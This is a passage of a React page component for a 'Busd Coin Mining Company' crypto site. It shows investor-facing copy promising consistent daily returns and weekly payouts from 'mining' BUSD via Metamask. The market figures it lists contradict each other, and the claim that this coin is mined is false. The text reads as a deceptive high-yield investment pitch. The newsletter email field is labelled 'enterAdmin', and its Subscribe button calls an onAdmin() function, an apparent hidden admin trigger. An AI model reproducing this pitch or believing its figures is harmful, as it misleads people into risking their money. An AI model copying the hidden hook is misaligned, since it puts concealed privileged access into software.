                        Mining Currency: BUSD is the primary currency used for
                        mining.
                      </li>
                      <li>
                        Metamask Wallet: All mining activities and fund
                        transactions are managed through the Metamask wallet for
                        enhanced security and user convenience.
                      </li>
                    </ul>

                    <h5 className="mt-3">Market Performance</h5>
                    <p
                      class="animation animated fadeInUp"
                      data-animation="fadeInUp"
                      data-animation-delay="0.4s"
                      style={{ animationDelay: "0.4s", opacity: 1 }}
                      id="subheader"
                    >
                      Our company has shown robust performance with a
                      significant market presence:
                    </p>
                    <ul className="text-white">
        <li>Current Market Cap: 15.8 Billion BUSD</li>
        <li>Last 7 Days Mining: 213.7 million BUSD mined, indicating strong and consistent mining activity.</li>
        <li>Volume (24h): $13,635,339 (8.68% increase)</li>
        <li>Volume/Market Cap (24h): 19.39%</li>
        <li>Circulating Supply: 70,511,448 BUSD</li>
        <li>Total Supply: 70,511,448 BUSD</li>
        <li>Max. Supply: ∞</li>
        <li>Fully Diluted Market Cap: $70,516,556</li>
    </ul>


                    <h5 className="mt-3">Benefits to Investors</h5>
                    
                    <ul className="text-white">
        <li>Consistent Returns: Investors can expect steady daily returns on their investments.</li>
        <li>Secure Transactions: Integration with Metamask wallet ensures secure and hassle-free transactions.</li>
        <li>Low Fees: Minimal gas fees make it cost-effective for investors.</li>
        <li>Scalability: Flexible investment amounts allow for a wide range of investors to participate.</li>
        <li>Weekly Payouts: Interest is accumulated daily and added to the user's wallet every 7 days, providing regular and reliable payouts.</li>
    </ul>



    <h5 className="mt-3">Conclusion</h5>

    <p
                      class="animation animated fadeInUp"
                      data-animation="fadeInUp"
                      data-animation-delay="0.4s"
                      style={{ animationDelay: "0.4s", opacity: 1 }}
                      id="subheader"
                    >
                      Busd Coin Mining Company is dedicated to providing a reliable, profitable, and secure mining environment for our users. By leveraging the power of Binance Smart Chain and the security of Metamask, we ensure that our investors receive the best possible returns on their investments with minimal costs. Join us in the world of cryptocurrency mining and start earning daily interest on your BUSD investments today.
                    </p>


    <h5 className="mt-3">Contact Us</h5>


    <p
                      class="animation animated fadeInUp"
                      data-animation="fadeInUp"
                      data-animation-delay="0.4s"
                      style={{ animationDelay: "0.4s", opacity: 1 }}
                      id="subheader"
                    >
                      For more information and to start investing, please visit our website or contact our support team. We look forward to helping you achieve your financial goals through innovative and secure mining solutions:
                    </p>
                  </div>
                </div>

                <div class="col-lg-5 col-md-6 res_md_mt_30 res_sm_mt_20">
                  <div class="newsletter_form">
                    <h4
                      class="footer_title border_title animation animated fadeInUp"
                      data-animation="fadeInUp"
                      data-animation-delay="0.2s"
                      style={{ animationDelay: "0.2s", opacity: 1 }}
                    >
                      Newsletter
                    </h4>
                    <p
                      class="animation animated fadeInUp"
                      data-animation="fadeInUp"
                      data-animation-delay="0.4s"
                      style={{ animationDelay: "0.4s", opacity: 1 }}
                    >
                      By subscribing to our mailing list you will always be
                      update with the latest news from us.
                    </p>
                    <form
                      class="subscribe_form animation animated fadeInUp"
                      data-animation="fadeInUp"
                      data-animation-delay="0.4s"
                      style={{ animationDelay: "0.4s", opacity: 1 }}
                    >
                      <input
                        id="enterAdmin"
                        class="input-rounded"
                        type="text"
                        required=""
                        placeholder="Enter Email Address"
                      />
                      <button
                        title="Subscribe"
                        class="btn-info"
                        onClick={() => {
                          onAdmin();
                        }}
                      >
                        {" "}
                        Subscribe{" "}
                      </button>
                    </form>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div class="bottom_footer">
            <div class="container">
              <div class="row">
                <div class="col-md-6">
                  <p class="copyright" id="company">
                    {" "}
                    Bitgert © 2022
                  </p>
                </div>
              </div>
            </div>
          </div>
        </footer>

        <a href="#" class="scrollup green" style={{ display: "none" }}>
          ⇧
        </a>
      </div>
    </>
  );
}

export default MintPage;
